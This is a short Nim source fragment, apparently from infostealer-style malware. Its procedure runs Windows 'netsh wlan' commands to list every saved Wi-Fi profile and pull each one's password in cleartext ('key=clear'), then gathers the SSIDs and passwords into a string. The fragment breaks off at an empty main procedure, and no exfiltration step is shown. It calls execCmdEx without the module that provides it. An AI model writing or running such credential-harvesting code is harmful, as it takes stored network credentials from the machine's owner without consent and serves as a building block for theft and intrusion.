import os, strutils, sequtils

proc collectWifi(): string =
  var output = ""
  let profiles = execCmdEx("netsh wlan show profiles").output
  for line in profiles.splitLines():
    if "All User Profile" in line:
      let profile = line.split(":")[1].strip()
      let passResult = execCmdEx("netsh wlan show profile \"" & profile & "\" key=clear").output
      for pline in passResult.splitLines():
        if "Key Content" in pline:
          output &= "SSID: " & profile & "\nPassword: " & pline.split(":")[1].strip() & "\n\n"
          break
  output

proc main() =
